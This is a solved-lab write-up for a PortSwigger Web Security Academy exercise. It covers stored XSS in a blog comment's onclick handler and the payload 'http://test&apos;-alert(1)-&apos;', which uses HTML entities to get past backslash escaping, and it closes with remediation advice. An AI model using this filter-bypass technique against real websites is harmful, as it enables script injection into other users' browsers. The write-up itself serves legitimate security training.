# Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

## Overview

- **Category:** Cross-Site Scripting (Stored XSS / Nested HTML Attribute + JavaScript Context)
- **Difficulty:** Practitioner
- **Platform:** PortSwigger Web Security Academy
- **Status:** Solved

This lab contains a stored XSS vulnerability in the blog comment functionality where the user-supplied `website` URL is reflected inside a JavaScript string literal nested within an HTML `onclick` event handler attribute. Although the server HTML-encodes angle brackets (`<`, `>`) and double quotes (`"`), and backslash-escapes both single quotes (`'` → `\'`) and backslashes (`\` → `\\`), it fails to HTML-encode ampersands (`&`). By encoding our single quotes as HTML entities (`&apos;`), we bypass the server's JavaScript backslash-escaping filter; when the browser processes the `onclick` attribute, the HTML parser automatically decodes `&apos;` back into a literal `'` before passing the code to the JavaScript engine.

---

## Attack Scenario & Mental Model

```text
ATTACKER GOAL
  Execute alert(1) in the victim's browser when they click the comment author link
      ↓
VICTIM
  Any user viewing the blog post and clicking the author's name link
      ↓
SOURCE
  The `website` parameter in the comment submission form (`POST /post/comment`)
      ↓
CONTEXT & FILTER ANALYSIS (Nested Context: JS inside HTML Attribute)
  The server renders:
  <a id="author" href="USER_INPUT" onclick="var tracker={track(){}};tracker.track('USER_INPUT');">Name</a>
  - `<`, `>`, `"` are HTML-encoded (`&lt;`, `&gt;`, `&quot;`).
  - Literal `'` and `\` are backslash-escaped (`\'`, `\\`).
  - However, `&` is NOT HTML-encoded to `&amp;`!
      ↓
PARSER DIFFERENTIAL (Browser Execution Order for Event Attributes)
  When an HTML event handler attribute like `onclick="..."` is triggered:
  1. First, the **HTML parser** HTML-decodes the attribute value (turning `&apos;` into `'`).
  2. Second, the **JavaScript engine** executes the resulting decoded string.
      ↓
INJECTION / SINK
  Payload: http://test&apos;-alert(1)-&apos;
  1. Server filter sees no literal `'` or `\`, so it outputs:
     onclick="...tracker.track('http://test&apos;-alert(1)-&apos;');"
  2. Browser HTML-decodes the `onclick` attribute before JS execution into:
     ...tracker.track('http://test'-alert(1)-'');
      ↓
IMPACT
  Arbitrary JavaScript execution (`alert(1)`) when the link is clicked → Lab Solved!
```

---

## Step-by-Step Walkthrough

### 1. Inspecting the Reflection Context
Submitted a normal comment with `http://test.com` in the **Website** field and inspected the blog post HTML in Burp Suite:

```html
<a id="author" href="http://test.com" onclick="var tracker={track(){}};tracker.track('http://test.com');">test</a>
```

Testing special characters revealed that literal single quotes (`'`) and backslashes (`\`) are escaped as `\'` and `\\`, preventing standard JavaScript string breakout.

### 2. Bypassing Backslash Escaping via HTML Entities
Because `tracker.track('...')` resides inside an HTML `onclick` attribute rather than a `<script>` block, the browser performs **HTML entity decoding** on the attribute value prior to invoking the JavaScript interpreter.

By replacing literal single quotes (`'`) with the HTML entity `&apos;` (or `&#39;` / `&#x27;`), the server's backslash-escaping filter does not recognize the characters as single quotes and leaves them unescaped:

```text
http://test&apos;-alert(1)-&apos;
```

### 3. Submitting the Payload
Entered `http://test&apos;-alert(1)-&apos;` directly into the **Website** field of the comment form and clicked **Post Comment**.

The server rendered:

```html
<a id="author" href="http://test&apos;-alert(1)-&apos;" onclick="var tracker={track(){}};tracker.track('http://test&apos;-alert(1)-&apos;');">test</a>
```

Upon clicking the author link (or automatically when the lab victim bot clicked it), the browser decoded `&apos;` to `'`, evaluated `'http://test'-alert(1)-''`, executed `alert(1)`, and solved the lab.

---

## Key Takeaways & Remediation

### Why Nested Contexts Require Multi-Layer Encoding
When untrusted data is placed inside a JavaScript string that is itself inside an HTML event attribute (`onclick`, `onload`, `onmouseover`), the browser reverses the encoding layers during parsing: **HTML Attribute Decoding → JavaScript Parsing**. If the server only applies JavaScript string escaping (`\'`) without subsequently HTML-encoding the entire string for the HTML attribute context (`&` → `&amp;`), attackers can smuggle JavaScript delimiters using HTML entities (`&apos;`, `&#x27;`, `\u0027`).

### Remediation
- **Apply Context-Aware Encoding in the Correct Order:** First apply JavaScript escaping to the variable, and then apply full HTML attribute encoding (including `&` → `&amp;`, `"` → `&quot;`, `'` → `&#x27;`) to the resulting script string before placing it in `onclick="..."`.
- **Avoid Inline Event Handlers:** Attach event listeners in external JavaScript files (`addEventListener`) and read user data safely from `data-*` attributes instead of generating inline `onclick` JS code on the server.
